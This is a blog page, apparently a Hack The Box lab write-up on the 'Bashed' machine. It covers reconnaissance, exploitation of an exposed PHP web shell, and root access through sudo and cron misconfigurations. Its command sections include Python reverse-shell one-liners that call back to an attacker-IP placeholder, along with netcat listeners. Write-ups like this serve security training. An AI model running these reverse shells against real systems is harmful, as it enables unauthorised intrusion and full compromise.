@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Bashed - Hack the Box | Security With Ian</title>
+<meta name="keywords" content="">
+<meta name="description" content="Difficulty: Easy
+OS: Linux
+Date Completed: 2026-09-25
+Write-up Authored by: Ian Simons
+Challenge Created by: Arrexel
+Core Competencies:
+
+
+Web application enumeration
+
+
+Post-exploitation Enumeration
+
+
+Linux Privilege Escalation
+
+
+
+Overview
+This Machine was completed as a complement to my training in the Hack The Box Academy Penetration Tester Job-Role Path. This box was chosen to further improve my manual enumeration and exploitation skills, and build confidence in my existing skill set.
+Note: Flags documented in Appendix B.">
+<meta name="author" content="">
+<link rel="canonical" href="https://SecurityWithIan.com/posts/bashed--hack-the-box/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://SecurityWithIan.com/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://SecurityWithIan.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://SecurityWithIan.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://SecurityWithIan.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://SecurityWithIan.com/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://SecurityWithIan.com/posts/bashed--hack-the-box/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://SecurityWithIan.com/posts/bashed--hack-the-box/">
+  <meta property="og:site_name" content="Security With Ian">
+  <meta property="og:title" content="Bashed - Hack the Box">
+  <meta property="og:description" content="Difficulty: Easy
+OS: Linux
+Date Completed: 2026-09-25
+Write-up Authored by: Ian Simons
+Challenge Created by: Arrexel
+Core Competencies:
+Web application enumeration
+Post-exploitation Enumeration
+Linux Privilege Escalation
+Overview This Machine was completed as a complement to my training in the Hack The Box Academy Penetration Tester Job-Role Path. This box was chosen to further improve my manual enumeration and exploitation skills, and build confidence in my existing skill set. Note: Flags documented in Appendix B.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-09-29T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-09-29T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Bashed - Hack the Box">
+  <meta name="twitter:description" content="Difficulty: Easy
+OS: Linux
+Date Completed: 2026-09-25
+Write-up Authored by: Ian Simons
+Challenge Created by: Arrexel
+Core Competencies:
+Web application enumeration
+Post-exploitation Enumeration
+Linux Privilege Escalation
+Overview This Machine was completed as a complement to my training in the Hack The Box Academy Penetration Tester Job-Role Path. This box was chosen to further improve my manual enumeration and exploitation skills, and build confidence in my existing skill set. Note: Flags documented in Appendix B.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://SecurityWithIan.com/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Bashed - Hack the Box",
+      "item": "https://SecurityWithIan.com/posts/bashed--hack-the-box/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Bashed - Hack the Box",
+  "name": "Bashed - Hack the Box",
+  "description": "Difficulty: Easy\nOS: Linux\nDate Completed: 2026-09-25\nWrite-up Authored by: Ian Simons\nChallenge Created by: Arrexel\nCore Competencies:\nWeb application enumeration\nPost-exploitation Enumeration\nLinux Privilege Escalation\nOverview This Machine was completed as a complement to my training in the Hack The Box Academy Penetration Tester Job-Role Path. This box was chosen to further improve my manual enumeration and exploitation skills, and build confidence in my existing skill set. Note: Flags documented in Appendix B.\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Difficulty: Easy\nOS: Linux\nDate Completed: 2026-09-25\nWrite-up Authored by: Ian Simons\nChallenge Created by: Arrexel\nCore Competencies:\nWeb application enumeration\nPost-exploitation Enumeration\nLinux Privilege Escalation\nOverview This Machine was completed as a complement to my training in the Hack The Box Academy Penetration Tester Job-Role Path. This box was chosen to further improve my manual enumeration and exploitation skills, and build confidence in my existing skill set. Note: Flags documented in Appendix B.\nVulnerability Summary Vulnerability Vulnerability Classification CVSS Score MITRE ATT\u0026CK Technique ATT\u0026CK Tactic Exposed Unauthenticated PHP Web Shell CWE-306: Missing Authentication for Critical function, CWE-862: Missing Authorization, OWASP 2025:A01 - Broken Access Control 9.8 (v3) T1190 - Exploit Public Facing Application Initial Access Sudo Misconfiguration Allowing User Impersonation CWE-266: Incorrect Privilege Assignment,CWE-269: Improper Privilege Management 6.8 (v3) T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching Privilege Escalation Root-Owned Scheduled Task Executing User-Controlled Scripts CWE-732: Incorrect Permission Assignment for Critical Resource 8.8 (v3) T1053.003 - Scheduled Task/Job: Cron Privilege Escalation Attack Path Summary Performed network reconnaissance with Nmap and identified Apache HTTP service running on Ubuntu\nPerformed web enumeration and identified an exposed webshell with no access controls\nLeveraged the existing web shell to obtain a Python reverse shell on target machine.\nIdentified that user www-data could use sudo to execute commands as scriptmanager\nIdentified that scriptmanager had write access to the /scripts directory. Further observation revealed that Python scripts in this directory were executed by a root-owned scheduled task every minute\nPlaced a Python reverse shell in the /scripts directory and leveraged the root-owned scheduled task to obtain a root shell\nReconnaissance Port Discovery Nmap Scan Results\n# Nmap 7.99 scan initiated Fri Sep 25 08:30:12 2026 as: /usr/lib/nmap/nmap --privileged -sC -sV -oA nmap/scan -p- 10.129.75.123 Nmap scan report for 10.129.75.123 Host is up (0.051s latency). Not shown: 65534 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel's Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 25 08:30:51 2026 -- 1 IP address (1 host up) scanned in 39.02 seconds Key Open Ports and Services Port Service Version 80/tcp HTTP Apache httpd 2.4.18 Web Enumeration Initial manual web enumeration yielded no immediate attack vectors. The home page primarily described a custom web shell developed by the site owner. A Gobuster scan was then run. The results are below.\n──(kali㉿kali)-[~/Documents/write-up-gen] └─$ gobuster dir -u http://10.129.75.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.8.2 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.75.123 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.8.2 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== images (Status: 301) [Size: 315] [--\u003e http://10.129.75.123/images/] uploads (Status: 301) [Size: 316] [--\u003e http://10.129.75.123/uploads/] php (Status: 301) [Size: 312] [--\u003e http://10.129.75.123/php/] css (Status: 301) [Size: 312] [--\u003e http://10.129.75.123/css/] dev (Status: 301) [Size: 312] [--\u003e http://10.129.75.123/dev/] js (Status: 301) [Size: 311] [--\u003e http://10.129.75.123/js/] fonts (Status: 301) [Size: 314] [--\u003e http://10.129.75.123/fonts/] server-status (Status: 403) [Size: 301] Progress: 220558 / 220558 (100.00%) =============================================================== Finished =============================================================== The Gobuster scan identified the /dev directory. Further enumeration of this location exposed /dev/phpbash.php, an accessible PHP web shell.\nVulnerability Research /dev/phpbash.php is accessible to any user who discovers it; it has no authentication mechanism. This means that an attacker who successfully identifies this file immediately obtains unauthenticated remote code execution.\nInitial Access Vulnerability Details Description: Exposed Unauthenticated PHP Web Shell\nVulnerability Classification: CWE-306: Missing Authentication for Critical function, CWE-862: Missing Authorization, OWASP 2025:A01 - Broken Access Control\nCVSS Score: 9.8 (v3)\nMITRE ATT\u0026CK: Initial Access - T1190 - Exploit Public Facing Application\nAn exposed and unauthenticated PHP web shell was identified at /dev/phpbash.php. Arbitrary commands could be executed through the interface, allowing a Python reverse shell payload to be launched and resulting in interactive command execution on the target host.\nExploitation Steps The exposed web shell permitted arbitrary command execution in the web server’s security context. This capability was used to execute a Python reverse shell payload and obtain an interactive session on the target system.\nNavigate to /dev/phpbash.php\nRun nc -lvnp 4242 on the attacker machine\nExecute a Python reverse shell payload through the web shell interface\nKey Commands / Payloads #Set up reverse shell catcher nc -lvnp 4242 #Python reverse shell to be run in the webshell python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' Proof of Access Screenshots Figure 1: Proof of initial access gained through the exposed PHP web shell. Interactive command execution was validated by confirming the current user context, hostname, and operating system.\nSession Validation Commands #Verify execution context whoami #Verify user id id #Verify target hostname hostname #Verify target operating system uname -a Privilege Escalation Vulnerability Details Description: Sudo Misconfiguration Allowing User Impersonation, Root-Owned Scheduled Task Executing User-Controlled Scripts\nVulnerability Classification: CWE-266: Incorrect Privilege Assignment, CWE-269: Improper Privilege Management, CWE-732: Incorrect Permission Assignment for Critical Resource\nCVSS Scores: 6.8 (v3), 8.8 (v3)\nMITRE ATT\u0026CK: Privilege Escalation - T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Privilege Escalation - T1053.003 - Scheduled Task/Job: Cron\nSudo enumeration revealed that www-data was able to run commands as scriptmanager without a password. Additional enumeration identified the /scripts directory, which was writable by the scriptmanager user, and a root-owned scheduled task that executed Python scripts from this directory every minute. Because the scriptmanager user could modify files within /scripts and a root-owned scheduled task executed scripts from that directory, arbitrary code execution as root was possible. This scheduled task was identified by observing that the existing script test.py would output the file test.txt, which was owned by root. A Python script was created that wrote the current timestamp to a file each time it was executed. The file updated automatically every minute and was owned by root, confirming execution in the root security context.\nEnumerate sudo permissions and identify that www-data can run commands as scriptmanager without a password\nLeveraged sudo permissions to obtain an interactive shell running as scriptmanager\nIdentified /scripts directory, which was writable by the scriptmanager user\nDetermined that a root-owned scheduled task was executing Python scripts from the /scripts directory every minute through observation of file creation and execution behavior\nPlaced a Python reverse shell in the /scripts directory and leveraged execution by the root-owned scheduled task to obtain a shell running as root\nKey Commands / Payloads #enumerate Sudo permissions sudo -l #Start interactive shell as scriptmanager sudo -u scriptmanager \"/bin/bash\" #Check privileges of /scripts directory ls -ld /scripts #Place python reverse shell in /scripts directory echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",8282));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")' \u003e /scripts/shell.py #Setup Netcat listener nc -lvnp 8282 Proof of Privilege Escalation Screenshots Figure 2: Proof of Privilege Escalation. Deployment of a Python script executed by a root-owned scheduled task resulted in code execution as root. Elevated privileges were validated by confirming the execution context with the whoami command and id.\nSession Validation Commands #Verify execution context whoami #Verify user id id #Verify target hostname hostname #Verify target operating system uname -a Lessons Learned The goal of this box was to further improve my manual enumeration and exploitation skills. While there were some learning points along the way, this box definitely increased my confidence in my existing skills.\nSlow down and observe system behavior. Valuable findings are often revealed through patterns that emerge over time\nFocus on observable behavior first. Complete understanding of the underlying mechanism is not always required to identify a viable attack path\nManually validate findings. Additional context and opportunities are often discovered during hands-on verification\nAppendix Appendix A Tools Used Tool Purpose Nmap Network and Service Enumeration Gobuster Web Enumeration Appendix B Flags Found User Flag:\n980**************************597\nRoot Flag:\n101**************************acd\nAppendix C Supporting Evidence No additional supporting evidence was required beyond the artifacts included throughout this write-up.\n",
+  "wordCount" : "1295",
+  "inLanguage": "en",
+  "datePublished": "2026-09-29T00:00:00Z",
+  "dateModified": "2026-09-29T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://SecurityWithIan.com/posts/bashed--hack-the-box/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Security With Ian",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://SecurityWithIan.com/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="https://SecurityWithIan.com/" accesskey="h" title="Security With Ian (Alt + H)">Security With Ian</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="https://SecurityWithIan.com/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://SecurityWithIan.com/security-toolkit/" title="Security Toolkit">
+                    <span>Security Toolkit</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Bashed - Hack the Box
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-09-29 00:00:00 +0000 UTC'>September 29, 2026</span>
+
+</div>
+  </header> 
+  <div class="post-content md-content"><p><strong>Difficulty:</strong> Easy</p>
+<p><strong>OS:</strong> Linux</p>
+<p><strong>Date Completed:</strong> 2026-09-25</p>
+<p><strong>Write-up Authored by:</strong> Ian Simons</p>
+<p><strong>Challenge Created by:</strong> Arrexel</p>
+<p><strong>Core Competencies:</strong></p>
+<ul>
+<li>
+<p>Web application enumeration</p>
+</li>
+<li>
+<p>Post-exploitation Enumeration</p>
+</li>
+<li>
+<p>Linux Privilege Escalation</p>
+</li>
+</ul>
+<hr>
+<h3 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h3>
+<p>This Machine was completed as a complement to my training in the Hack The Box Academy Penetration Tester Job-Role Path. This box was chosen to further improve my manual enumeration and exploitation skills, and build confidence in my existing skill set.<!-- raw HTML omitted -->
+Note: Flags documented in Appendix B.</p>
+<hr>
+<h3 id="vulnerability-summary">Vulnerability Summary<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h3>
+<table>
+	<thead>
+			<tr>
+					<th>Vulnerability</th>
+					<th>Vulnerability Classification</th>
+					<th>CVSS Score</th>
+					<th>MITRE ATT&amp;CK Technique</th>
+					<th>ATT&amp;CK Tactic</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Exposed Unauthenticated PHP Web Shell</td>
+					<td>CWE-306: Missing Authentication for Critical function, <!-- raw HTML omitted -->CWE-862: Missing Authorization, <!-- raw HTML omitted -->OWASP 2025:A01 - Broken Access Control</td>
+					<td>9.8 (v3)</td>
+					<td>T1190 - Exploit Public Facing Application</td>
+					<td>Initial Access</td>
+			</tr>
+			<tr>
+					<td>Sudo Misconfiguration Allowing User Impersonation</td>
+					<td>CWE-266: Incorrect Privilege Assignment,<!-- raw HTML omitted -->CWE-269: Improper Privilege Management</td>
+					<td>6.8 (v3)</td>
+					<td>T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching</td>
+					<td>Privilege Escalation</td>
+			</tr>
+			<tr>
+					<td>Root-Owned Scheduled Task Executing User-Controlled Scripts</td>
+					<td>CWE-732: Incorrect Permission Assignment for Critical Resource</td>
+					<td>8.8 (v3)</td>
+					<td>T1053.003 - Scheduled Task/Job: Cron</td>
+					<td>Privilege Escalation</td>
+			</tr>
+	</tbody>
+</table>
+<hr>
+<h3 id="attack-path-summary">Attack Path Summary<a hidden class="anchor" aria-hidden="true" href="#attack-path-summary">#</a></h3>
+<ol>
+<li>
+<p>Performed network reconnaissance with Nmap and identified Apache HTTP service running on Ubuntu</p>
+</li>
+<li>
+<p>Performed web enumeration and identified an exposed webshell with no access controls</p>
+</li>
+<li>
+<p>Leveraged the existing web shell to obtain a Python reverse shell on target machine.</p>
+</li>
+<li>
+<p>Identified that user www-data could use sudo to execute commands as scriptmanager</p>
+</li>
+<li>
+<p>Identified that scriptmanager had write access to the <strong>/scripts</strong> directory. Further observation revealed that Python scripts in this directory were executed by a root-owned scheduled task every minute</p>
+</li>
+<li>
+<p>Placed a Python reverse shell in the <strong>/scripts</strong> directory and leveraged the root-owned scheduled task to obtain a root shell</p>
+</li>
+</ol>
+<hr>
+<h3 id="reconnaissance">Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#reconnaissance">#</a></h3>
+<h4 id="port-discovery">Port Discovery<a hidden class="anchor" aria-hidden="true" href="#port-discovery">#</a></h4>
+<p>Nmap Scan Results</p>
+<pre tabindex="0"><code># Nmap 7.99 scan initiated Fri Sep 25 08:30:12 2026 as: /usr/lib/nmap/nmap --privileged -sC -sV -oA nmap/scan -p- 10.129.75.123
+Nmap scan report for 10.129.75.123
+Host is up (0.051s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel&#39;s Development Site
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Sep 25 08:30:51 2026 -- 1 IP address (1 host up) scanned in 39.02 seconds
+</code></pre><h4 id="key-open-ports-and-services">Key Open Ports and Services<a hidden class="anchor" aria-hidden="true" href="#key-open-ports-and-services">#</a></h4>
+<table>
+	<thead>
+			<tr>
+					<th>Port</th>
+					<th>Service</th>
+					<th>Version</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>80/tcp</td>
+					<td>HTTP</td>
+					<td>Apache httpd 2.4.18</td>
+			</tr>
+	</tbody>
+</table>
+<h4 id="web-enumeration">Web Enumeration<a hidden class="anchor" aria-hidden="true" href="#web-enumeration">#</a></h4>
+<p>Initial manual web enumeration yielded no immediate attack vectors. The home page primarily described a custom web shell developed by the site owner. A <strong>Gobuster</strong> scan was then run. The results are below.</p>
+<pre tabindex="0"><code>──(kali㉿kali)-[~/Documents/write-up-gen]
+└─$ gobuster dir -u http://10.129.75.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.75.123
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+images               (Status: 301) [Size: 315] [--&gt; http://10.129.75.123/images/]
+uploads              (Status: 301) [Size: 316] [--&gt; http://10.129.75.123/uploads/]
+php                  (Status: 301) [Size: 312] [--&gt; http://10.129.75.123/php/]
+css                  (Status: 301) [Size: 312] [--&gt; http://10.129.75.123/css/]
+dev                  (Status: 301) [Size: 312] [--&gt; http://10.129.75.123/dev/]
+js                   (Status: 301) [Size: 311] [--&gt; http://10.129.75.123/js/]
+fonts                (Status: 301) [Size: 314] [--&gt; http://10.129.75.123/fonts/]
+server-status        (Status: 403) [Size: 301]
+Progress: 220558 / 220558 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code></pre><p>The <strong>Gobuster</strong> scan identified the <strong>/dev</strong> directory. Further enumeration of this location exposed <strong>/dev/phpbash.php</strong>, an accessible PHP web shell.</p>
+<h4 id="vulnerability-research">Vulnerability Research<a hidden class="anchor" aria-hidden="true" href="#vulnerability-research">#</a></h4>
+<p><strong>/dev/phpbash.php</strong> is accessible to any user who discovers it; it has no authentication mechanism. This means that an attacker who successfully identifies this file immediately obtains unauthenticated remote code execution.</p>
+<hr>
+<h3 id="initial-access">Initial Access<a hidden class="anchor" aria-hidden="true" href="#initial-access">#</a></h3>
+<h4 id="vulnerability-details">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h4>
+<p><strong>Description:</strong> Exposed Unauthenticated PHP Web Shell</p>
+<p><strong>Vulnerability Classification:</strong> CWE-306: Missing Authentication for Critical function, CWE-862: Missing Authorization, OWASP 2025:A01 - Broken Access Control</p>
+<p><strong>CVSS Score:</strong> 9.8 (v3)</p>
+<p><strong>MITRE ATT&amp;CK:</strong> Initial Access - T1190 - Exploit Public Facing Application</p>
+<p>An exposed and unauthenticated PHP web shell was identified at <strong>/dev/phpbash.php</strong>. Arbitrary commands could be executed through the interface, allowing a Python reverse shell payload to be launched and resulting in interactive command execution on the target host.</p>
+<h4 id="exploitation-steps">Exploitation Steps<a hidden class="anchor" aria-hidden="true" href="#exploitation-steps">#</a></h4>
+<p>The exposed web shell permitted arbitrary command execution in the web server&rsquo;s security context. This capability was used to execute a Python reverse shell payload and obtain an interactive session on the target system.</p>
+<ol>
+<li>
+<p>Navigate to <strong>/dev/phpbash.php</strong></p>
+</li>
+<li>
+<p>Run <code>nc -lvnp 4242</code> on the attacker machine</p>
+</li>
+<li>
+<p>Execute a Python reverse shell payload through the web shell interface</p>
+</li>
+</ol>
+<h4 id="key-commands--payloads">Key Commands / Payloads<a hidden class="anchor" aria-hidden="true" href="#key-commands--payloads">#</a></h4>
+<pre tabindex="0"><code>#Set up reverse shell catcher
+
+nc -lvnp 4242
+
+#Python reverse shell to be run in the webshell
+python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;ATTACKER_IP&gt;&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;
+</code></pre><h4 id="proof-of-access">Proof of Access<a hidden class="anchor" aria-hidden="true" href="#proof-of-access">#</a></h4>
+<h5 id="screenshots">Screenshots<a hidden class="anchor" aria-hidden="true" href="#screenshots">#</a></h5>
+<p><img alt="InitialAccess.jpg" loading="lazy" src="/images/bashed/InitialAccess.jpg"></p>
+<p>Figure 1: Proof of initial access gained through the exposed PHP web shell. Interactive command execution was validated by confirming the current user context, hostname, and operating system.</p>
+<h5 id="session-validation-commands">Session Validation Commands<a hidden class="anchor" aria-hidden="true" href="#session-validation-commands">#</a></h5>
+<pre tabindex="0"><code>#Verify execution context
+whoami
+
+#Verify user id
+id
+
+#Verify target hostname
+hostname
+
+#Verify target operating system
+uname -a
+</code></pre><hr>
+<h3 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h3>
+<h4 id="vulnerability-details-1">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details-1">#</a></h4>
+<p><strong>Description:</strong> Sudo Misconfiguration Allowing User Impersonation, Root-Owned Scheduled Task Executing User-Controlled Scripts</p>
+<p><strong>Vulnerability Classification:</strong> CWE-266: Incorrect Privilege Assignment, CWE-269: Improper Privilege Management, CWE-732: Incorrect Permission Assignment for Critical Resource</p>
+<p><strong>CVSS Scores:</strong> 6.8 (v3), 8.8 (v3)</p>
+<p><strong>MITRE ATT&amp;CK:</strong> Privilege Escalation - T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Privilege Escalation - T1053.003 - Scheduled Task/Job: Cron</p>
+<p>Sudo enumeration revealed that www-data was able to run commands as scriptmanager without a password. Additional enumeration identified the <strong>/scripts</strong> directory, which was writable by the scriptmanager user, and a root-owned scheduled task that executed Python scripts from this directory every minute. Because the scriptmanager user could modify files within /scripts and a root-owned scheduled task executed scripts from that directory, arbitrary code execution as root was possible. This scheduled task was identified by observing that the existing script <strong>test.py</strong> would output the file <strong>test.txt</strong>, which was owned by root. A Python script was created that wrote the current timestamp to a file each time it was executed. The file updated automatically every minute and was owned by root, confirming execution in the root security context.</p>
+<ol>
+<li>
+<p>Enumerate sudo permissions and identify that www-data can run commands as scriptmanager without a password</p>
+</li>
+<li>
+<p>Leveraged sudo permissions to obtain an interactive shell running as scriptmanager</p>
+</li>
+<li>
+<p>Identified <strong>/scripts</strong> directory, which was writable by the scriptmanager user</p>
+</li>
+<li>
+<p>Determined that a root-owned scheduled task was executing Python scripts from the <strong>/scripts</strong> directory every minute through observation of file creation and execution behavior</p>
+</li>
+<li>
+<p>Placed a Python reverse shell in the <strong>/scripts</strong> directory and leveraged execution by the root-owned scheduled task to obtain a shell running as root</p>
+</li>
+</ol>
+<h4 id="key-commands--payloads-1">Key Commands / Payloads<a hidden class="anchor" aria-hidden="true" href="#key-commands--payloads-1">#</a></h4>
+<pre tabindex="0"><code>#enumerate Sudo permissions
+sudo -l
+
+#Start interactive shell as scriptmanager
+sudo -u scriptmanager &#34;/bin/bash&#34;
+
+#Check privileges of /scripts directory
+ls -ld /scripts
+
+#Place python reverse shell in /scripts directory
+echo &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;ATTACKER_IP&gt;&#34;,8282));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/bash&#34;)&#39; &gt; /scripts/shell.py
+
+#Setup Netcat listener
+nc -lvnp 8282
+</code></pre><h4 id="proof-of-privilege-escalation">Proof of Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#proof-of-privilege-escalation">#</a></h4>
+<h5 id="screenshots-1">Screenshots<a hidden class="anchor" aria-hidden="true" href="#screenshots-1">#</a></h5>
+<p><img alt="PrivEsc.jpg" loading="lazy" src="/images/bashed/PrivEsc.jpg"></p>
+<p>Figure 2: Proof of Privilege Escalation. Deployment of a Python script executed by a root-owned scheduled task resulted in code execution as root. Elevated privileges were validated by confirming the execution context with the <code>whoami</code> command and <code>id</code>.</p>
+<h5 id="session-validation-commands-1">Session Validation Commands<a hidden class="anchor" aria-hidden="true" href="#session-validation-commands-1">#</a></h5>
+<pre tabindex="0"><code>#Verify execution context
+whoami
+
+#Verify user id
+id
+
+#Verify target hostname
+hostname
+
+#Verify target operating system
+uname -a
+</code></pre><hr>
+<h3 id="lessons-learned">Lessons Learned<a hidden class="anchor" aria-hidden="true" href="#lessons-learned">#</a></h3>
+<p>The goal of this box was to further improve my manual enumeration and exploitation skills. While there were some learning points along the way, this box definitely increased my confidence in my existing skills.</p>
+<ul>
+<li>
+<p>Slow down and observe system behavior. Valuable findings are often revealed through patterns that emerge over time</p>
+</li>
+<li>
+<p>Focus on observable behavior first. Complete understanding of the underlying mechanism is not always required to identify a viable attack path</p>
+</li>
+<li>
+<p>Manually validate findings. Additional context and opportunities are often discovered during hands-on verification</p>
+</li>
+</ul>
+<hr>
+<h3 id="appendix">Appendix<a hidden class="anchor" aria-hidden="true" href="#appendix">#</a></h3>
+<h4 id="appendix-a">Appendix A<a hidden class="anchor" aria-hidden="true" href="#appendix-a">#</a></h4>
+<h5 id="tools-used">Tools Used<a hidden class="anchor" aria-hidden="true" href="#tools-used">#</a></h5>
+<table>
+	<thead>
+			<tr>
+					<th>Tool</th>
+					<th>Purpose</th>
+			</tr>
